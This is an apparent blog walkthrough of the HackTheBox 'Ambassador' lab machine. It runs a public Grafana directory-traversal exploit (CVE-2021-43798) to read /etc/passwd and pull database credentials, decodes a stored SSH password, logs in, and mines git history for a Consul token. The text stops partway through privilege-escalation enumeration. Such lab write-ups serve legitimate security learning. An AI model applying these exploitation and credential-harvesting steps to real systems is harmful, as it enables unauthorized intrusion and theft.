<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="HackTheBox - Ambassador" /><meta property="og:locale" content="en" /><meta name="description" content="Overview This machine begins w/ a web enumeration, discovering that TCP/3000 is running grafana, where it is susceptible to a directory traversal &amp; arbitrary file read vulnerability. w/ this vulnerability, we are able to include grafana configuration file grafana.ini &amp; grafana.db allowing us to extract mysql user credentials. Accessing SQL reveals SSH credentials." /><meta property="og:description" content="Overview This machine begins w/ a web enumeration, discovering that TCP/3000 is running grafana, where it is susceptible to a directory traversal &amp; arbitrary file read vulnerability. w/ this vulnerability, we are able to include grafana configuration file grafana.ini &amp; grafana.db allowing us to extract mysql user credentials. Accessing SQL reveals SSH credentials." /><link rel="canonical" href="https://yufongg.github.io/posts/Ambassador/" /><meta property="og:url" content="https://yufongg.github.io/posts/Ambassador/" /><meta property="og:site_name" content="Yufong" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-10-23T00:00:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HackTheBox - Ambassador" /><meta name="twitter:site" content="@yufongg" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-06-09T02:05:28+08:00","datePublished":"2022-10-23T00:00:00+08:00","description":"Overview This machine begins w/ a web enumeration, discovering that TCP/3000 is running grafana, where it is susceptible to a directory traversal &amp; arbitrary file read vulnerability. w/ this vulnerability, we are able to include grafana configuration file grafana.ini &amp; grafana.db allowing us to extract mysql user credentials. Accessing SQL reveals SSH credentials.","headline":"HackTheBox - Ambassador","mainEntityOfPage":{"@type":"WebPage","@id":"https://yufongg.github.io/posts/Ambassador/"},"url":"https://yufongg.github.io/posts/Ambassador/"}</script><title>HackTheBox - Ambassador | Yufong</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Yufong"><meta name="application-name" content="Yufong"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/Vulnhub/Linux/Bob 1.0.1/images/koko.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Yufong</a></div><div class="site-subtitle font-italic">OSCP | Infosec Writeups</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/yufongg" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://www.youtube.com/watch?v=7hjHZOc-e4w" aria-label="youtube" target="_blank" rel="noopener"> <i class="fab fa-youtube"></i> </a> <a href="http://discordapp.com/users/175250797578158080" aria-label="discord" target="_blank" rel="noopener"> <i class="fab fa-discord"></i> </a> <a href="https://www.hackthebox.com/home/users/profile/834331" aria-label="hackthebox" target="_blank" rel="noopener"> <i class="fa fa-cube"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>HackTheBox - Ambassador</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1000 400'%3E%3C/svg%3E" data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Ambassador/images/Pasted%20image%2020221024005325.png" class="preview-img bg" alt="Preview Image" width="1000" height="400" data-proofer-ignore><h1 data-toc-skip>HackTheBox - Ambassador</h1><div class="post-meta text-muted"><div> By <em> <a href="https://github.com/yufongg">yufongg</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1666454400" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-10-23 </em> </span> <span> Updated <em class="timeago" data-ts="1749405928" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2025-06-09 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2691 words"> <em>14 min</em> read</span></div></div></div><div class="post-content"><h1 id="overview">Overview</h1><p>This machine begins w/ a web enumeration, discovering that TCP/3000 is running <code class="language-plaintext highlighter-rouge">grafana</code>, where it is susceptible to a directory traversal &amp; arbitrary file read vulnerability. w/ this vulnerability, we are able to include grafana configuration file <code class="language-plaintext highlighter-rouge">grafana.ini</code> &amp; <code class="language-plaintext highlighter-rouge">grafana.db</code> allowing us to extract <code class="language-plaintext highlighter-rouge">mysql</code> user credentials. Accessing SQL reveals SSH credentials.</p><p>After enumerating the system, <code class="language-plaintext highlighter-rouge">.git-config</code> is discovered on <code class="language-plaintext highlighter-rouge">developer</code> home directory, <code class="language-plaintext highlighter-rouge">.git-config</code> reveals <code class="language-plaintext highlighter-rouge">/opt/my-app</code> where <code class="language-plaintext highlighter-rouge">.git</code> exists, allowing us to view all the commits made, revealing credentials for <code class="language-plaintext highlighter-rouge">consul</code> service. <code class="language-plaintext highlighter-rouge">consul</code> service is vulnerable to a RCE exploit, whereby attackers can craft a malicious <code class="language-plaintext highlighter-rouge">json</code> service configuration file to do code execution, privilege escalating us to <code class="language-plaintext highlighter-rouge">root</code>.</p><hr /><div class="table-wrapper"><table><thead><tr><th>Column<th>Details<tbody><tr><td>Box Name<td>Ambassador<tr><td>IP<td>10.10.11.183<tr><td>Points<td>30<tr><td>Difficulty<td>Medium<tr><td>Creator<td><a href="https://www.hackthebox.com/home/users/profile/24906">DirectRoot</a><tr><td>Release Date<td>01 Oct 2022</table></div><h1 id="recon">Recon</h1><h2 id="tcp80-http">TCP/80 (HTTP) <a href="#tcp80-http" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li>FFUF<div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>  403      GET        9l       28w      277c http://10.10.11.183/.html
  200      GET       92l      143w     1793c http://10.10.11.183/404.html
  301      GET        9l       28w      317c http://10.10.11.183/categories <span class="o">=&gt;</span> http://10.10.11.183/categories/
  301      GET        9l       28w      313c http://10.10.11.183/images <span class="o">=&gt;</span> http://10.10.11.183/images/
  200      GET      155l      305w     3654c http://10.10.11.183/index.html
  301      GET        9l       28w      312c http://10.10.11.183/posts <span class="o">=&gt;</span> http://10.10.11.183/posts/
  200      GET       18l       22w      645c http://10.10.11.183/sitemap.xml
  301      GET        9l       28w      311c http://10.10.11.183/tags <span class="o">=&gt;</span> http://10.10.11.183/tags/
</pre></table></code></div></div><blockquote class="prompt-info"><div><p>Nothing really interesting.</p></div></blockquote></ul><h1 id="initial-foothold">Initial Foothold</h1><h2 id="tcp80-http-1">TCP/80 (HTTP) <a href="#tcp80-http-1" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Found a post, revealing a username <code class="language-plaintext highlighter-rouge">developer</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Ambassador/images/Pasted%20image%2020221022123113.png" alt="" data-proofer-ignore></ol><h2 id="tcp22-ssh---bruteforce-developer-user-failed">TCP/22 (SSH) - Bruteforce Developer User (Failed) <a href="#tcp22-ssh---bruteforce-developer-user-failed" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Tried to bruteforce failed.</ol><h2 id="tcp3000-http---cve-2021-43798-grafana-800-beta1--830-arbitrary-file-read">TCP/3000 (HTTP) - CVE-2021-43798, Grafana 8.0.0-beta1- 8.3.0 (Arbitrary File Read) <a href="#tcp3000-http---cve-2021-43798-grafana-800-beta1--830-arbitrary-file-read" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Found a login page @ <code class="language-plaintext highlighter-rouge">http://ambassador.htb:3000/login</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Ambassador/images/Pasted%20image%2020221022130044.png" alt="" data-proofer-ignore><blockquote class="prompt-info"><div><p>Grafana - is a multi-platform open source analytics and interactive visualization web application. It provides charts, graphs, and alerts for the web when connected to supported data sources.</p></div></blockquote><li><p>Search exploits for <code class="language-plaintext highlighter-rouge">Grafana</code></p><div class="table-wrapper"><table><thead><tr><th>Exploit Title<th>Path<tbody><tr><td>Grafana 7.0.1 - Denial of Service (PoC)<td>linux/dos/48638.sh<tr><td>Grafana 8.3.0 - Directory Traversal and Arbitrary File Read<td>multiple/webapps/50581.py</table></div><li>How does <code class="language-plaintext highlighter-rouge">Grafana 8.3.0 - Directory Traversal and Arbitrary File Read</code> work?<ul><li><code class="language-plaintext highlighter-rouge">Grafana</code> is vulnerable to a directory traversal vulnerability due to a lack of path normalization in the <code class="language-plaintext highlighter-rouge">/public/plugins//</code> URL.<li>Allowing unauthenticated attackers to read sensitive files on the server.</ul><li>Try <code class="language-plaintext highlighter-rouge">Grafana 8.3.0 - Directory Traversal and Arbitrary File Read</code> - <code class="language-plaintext highlighter-rouge">multiple/webapps/50581.py</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/ambassador/10.10.11.183/exploit]
 └─# python3 50581.py -H http://10.10.11.183:3000
 Read file &gt; /etc/passwd
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
 sys:x:3:3:sys:/dev:/usr/sbin/nologin
 sync:x:4:65534:sync:/bin:/bin/sync
 games:x:5:60:games:/usr/games:/usr/sbin/nologin
 man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
 lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
 mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
 news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
 uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
 proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
 www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
 backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
 list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
 irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
 gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
 nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
 systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
 systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
 systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
 messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
 syslog:x:104:110::/home/syslog:/usr/sbin/nologin
 _apt:x:105:65534::/nonexistent:/usr/sbin/nologin
 tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
 uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
 tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
 landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
 pollinate:x:110:1::/var/cache/pollinate:/bin/false
 usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
 sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
 systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
 developer:x:1000:1000:developer:/home/developer:/bin/bash
 lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
 grafana:x:113:118::/usr/share/grafana:/bin/false
 mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
 consul:x:997:997::/home/consul:/bin/false
</pre></table></code></div></div><blockquote class="prompt-info"><div><p>It works!</p></div></blockquote><li>Demo - <code class="language-plaintext highlighter-rouge">Grafana 8.3.0 - Directory Traversal and Arbitrary File Read</code> - <code class="language-plaintext highlighter-rouge">multiple/webapps/50581.py</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Ambassador/images/0pSYxUEhNJ.gif" alt="" data-proofer-ignore></ol><h2 id="tcp3306-mysql---access-mysql">TCP/3306 (MySQL) - Access MySQL <a href="#tcp3306-mysql---access-mysql" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Access mysql w/ <code class="language-plaintext highlighter-rouge">grafana:dontStandSoCloseToMe63221!</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/ambassador/10.10.11.183/exploit]
 └─# mysql -u grafana -p -h ambassador.htb
 Enter password:
 Welcome to the MariaDB monitor.  Commands end with ; or \g.
 Your MySQL connection id is 175
 Server version: 8.0.30-0ubuntu0.20.04.2 (Ubuntu)
	
 Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
	
 Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
	
 MySQL [(none)]&gt;
</pre></table></code></div></div><li>Exfiltrate SSH credentials<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/ambassador/10.10.11.183/exploit]
 └─# mysql -u grafana -p -h ambassador.htb
 Enter password:
 Welcome to the MariaDB monitor.  Commands end with ; or \g.
 Your MySQL connection id is 177
 Server version: 8.0.30-0ubuntu0.20.04.2 (Ubuntu)
	
 Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
	
 Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
	
 MySQL [(none)]&gt; show databases;
 +--------------------+
 | Database           |
 +--------------------+
 | grafana            |
 | information_schema |
 | mysql              |
 | performance_schema |
 | sys                |
 | whackywidget       |
 +--------------------+
 6 rows in set (0.247 sec)
	
 MySQL [(none)]&gt; use whackywidget;
 Reading table information for completion of table and column names
 You can turn off this feature to get a quicker startup with -A
	
 Database changed
 MySQL [whackywidget]&gt; show tables;
 +------------------------+
 | Tables_in_whackywidget |
 +------------------------+
 | users                  |
 +------------------------+
 1 row in set (0.247 sec)
	
 MySQL [whackywidget]&gt; SELECT * FROM users;
 +-----------+------------------------------------------+
 | user      | pass                                     |
 +-----------+------------------------------------------+
 | developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |
 +-----------+------------------------------------------+
 1 row in set (0.247 sec)
	
 MySQL [whackywidget]&gt;
</pre></table></code></div></div><li>Decrypt <code class="language-plaintext highlighter-rouge">Base64</code> encoded password<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/ambassador]
 └─# echo "YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==" | base64 -d
 anEnglishManInNewYork027468
</pre></table></code></div></div><blockquote class="prompt-info"><div><p>Valid Creds</p><ul><li><code class="language-plaintext highlighter-rouge">developer:anEnglishManInNewYork027468</code></ul></div></blockquote></ol><h2 id="tcp22-ssh---successfully-ssh">TCP/22 (SSH) - Successfully SSH <a href="#tcp22-ssh---successfully-ssh" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>SSH w/ <code class="language-plaintext highlighter-rouge">developer:anEnglishManInNewYork027468</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/ambassador]
 └─# sshpass -p "anEnglishManInNewYork027468" ssh developer@ambassador.htb
 Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64)
	
  * Documentation:  https://help.ubuntu.com
  * Management:     https://landscape.canonical.com
  * Support:        https://ubuntu.com/advantage
	
   System information as of Sat 22 Oct 2022 06:44:00 AM UTC
	
   System load:           0.0
   Usage of /:            84.6% of 5.07GB
   Memory usage:          55%
   Swap usage:            0%
   Processes:             232
   Users logged in:       0
   IPv4 address for eth0: 10.10.11.183
   IPv6 address for eth0: dead:beef::250:56ff:feb9:32a4
	
	
 0 updates can be applied immediately.
	
	
 The list of available updates is more than a week old.
 To check for new updates run: sudo apt update
 Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
	
	
 Last login: Sat Oct 22 01:09:02 2022 from 10.10.14.149
 developer@ambassador:~$ cat user.txt
 db92bc3f23be59a6a4f23743178c8ea4
</pre></table></code></div></div></ol><h1 id="privilege-escalation">Privilege Escalation</h1><h2 id="root---enumeration-git-repo">Root - Enumeration (.git Repo) <a href="#root---enumeration-git-repo" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Found <code class="language-plaintext highlighter-rouge">.gitconfig</code> file, revealing two interesting folders<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre> developer@ambassador:~$ cat .gitconfig
 [user]
         name = Developer
         email = developer@ambassador.local
 [safe]
         directory = /opt/my-app
</pre></table></code></div></div><blockquote class="prompt-info"><div><ul><li><code class="language-plaintext highlighter-rouge">/opt/my-app</code></ul></div></blockquote><li>Found <code class="language-plaintext highlighter-rouge">.git</code> directory, we can potentially find sensitive information from <code class="language-plaintext highlighter-rouge">git</code> logs<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre> developer@ambassador:/opt/my-app$ ls -la
 total 24
 drwxrwxr-x 5 root root 4096 Mar 13  2022 .
 drwxr-xr-x 4 root root 4096 Sep  1 22:13 ..
 drwxrwxr-x 4 root root 4096 Mar 13  2022 env
 drwxrwxr-x 8 root root 4096 Mar 14  2022 .git
 -rw-rw-r-- 1 root root 1838 Mar 13  2022 .gitignore
 drwxrwxr-x 3 root root 4096 Mar 13  2022 whackywidget
</pre></table></code></div></div><li><p>View <code class="language-plaintext highlighter-rouge">git</code> branches</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> developer@ambassador:/opt/my-app$ git branch
 * main
</pre></table></code></div></div><blockquote class="prompt-info"><div><ul><li>Git branches are effectively a pointer to a snapshot of your changes. When you want to add a new feature or fix a bug<li>Spawn a new branch to encapsulate your changes.<li>This makes it harder for unstable code to get merged into the main code base, and it gives you the chance to clean up your future’s history before merging it into the main branch. - <a href="https://www.atlassian.com/git/tutorials/using-branches#:~:text=In%20Git%2C%20branches%20are%20a,branch%20to%20encapsulate%20your%20changes.">Source</a></ul></div></blockquote><li>View logs for <code class="language-plaintext highlighter-rouge">main</code> branch<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre> developer@ambassador:/opt/my-app$ git log main
 commit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -&gt; main)
 Author: Developer &lt;developer@ambassador.local&gt;
 Date:   Sun Mar 13 23:47:36 2022 +0000
	
     tidy config script
	
 commit c982db8eff6f10f8f3a7d802f79f2705e7a21b55
 Author: Developer &lt;developer@ambassador.local&gt;
 Date:   Sun Mar 13 23:44:45 2022 +0000
	
     config script
	
 commit 8dce6570187fd1dcfb127f51f147cd1ca8dc01c6
 Author: Developer &lt;developer@ambassador.local&gt;
 Date:   Sun Mar 13 22:47:01 2022 +0000
	
     created project with django CLI
	
 commit 4b8597b167b2fbf8ec35f992224e612bf28d9e51
 Author: Developer &lt;developer@ambassador.local&gt;
 Date:   Sun Mar 13 22:44:11 2022 +0000
	
     .gitignore
</pre></table></code></div></div><blockquote class="prompt-info"><div><ul><li>Git logs displays all the commits being made in that repository in multiple lines along with the commit id, author name, date and commit message.<li>There are 2 interesting commits,<ul><li><code class="language-plaintext highlighter-rouge">33a53ef9a207976d5ceceddc41a199558843bf3c - tidy config script </code><li><code class="language-plaintext highlighter-rouge">8dce6570187fd1dcfb127f51f147cd1ca8dc01c6 - created project with django CLI </code></ul></ul></div></blockquote><li>View <code class="language-plaintext highlighter-rouge">8dce6570187fd1dcfb127f51f147cd1ca8dc01c6 - created project with django CLI </code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre> developer@ambassador:/opt/my-app$ git show 8dce6570187fd1dcfb127f51f147cd1ca8dc01c6
 ...SNIP...
 +# SECURITY WARNING: keep the secret key used in production secret!
 +SECRET_KEY = 'django-insecure--lqw3fdyxw(28h#0(w8_te*wm*6ppl@g!ttcpo^m-ig!qtqy!l'
 ...SNIP...
</pre></table></code></div></div><blockquote class="prompt-info"><div><p>This is likely a rabbit-hole, because <code class="language-plaintext highlighter-rouge">django-admin</code> does not exist on <code class="language-plaintext highlighter-rouge">ambassador.htb</code> &amp; <code class="language-plaintext highlighter-rouge">TCP/8000</code> (<code class="language-plaintext highlighter-rouge">django</code> Default Port) is not up.</p></div></blockquote><li>View <code class="language-plaintext highlighter-rouge">33a53ef9a207976d5ceceddc41a199558843bf3c - tidy config script</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre> developer@ambassador:/opt/my-app$ git show 33a53ef9a207976d5ceceddc41a199558843bf3c
 commit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -&gt; main)
 Author: Developer &lt;developer@ambassador.local&gt;
 Date:   Sun Mar 13 23:47:36 2022 +0000
	
     tidy config script
	
 diff --git a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.sh
 index 35c08f6..fc51ec0 100755
 --- a/whackywidget/put-config-in-consul.sh
 +++ b/whackywidget/put-config-in-consul.sh
 @@ -1,4 +1,4 @@
  # We use Consul for application config in production, this script will help set the correct values for the app
 -# Export MYSQL_PASSWORD before running
 +# Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before running
	
 -consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD
 +consul kv put whackywidget/db/mysql_pw $MYSQL_PASSWORD
</pre></table></code></div></div><blockquote class="prompt-info"><div><p><code class="language-plaintext highlighter-rouge">consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 </code> - token is revealed, this allows us to access the service.</p></div></blockquote><li>Check if <code class="language-plaintext highlighter-rouge">consul</code> is actually on the <code class="language-plaintext highlighter-rouge">ambassador.htb</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre> developer@ambassador:/opt/my-app$ consul
 Usage: consul [--version] [--help] &lt;command&gt; [&lt;args&gt;]
	
 developer@ambassador:/opt/my-app$ netstat -a
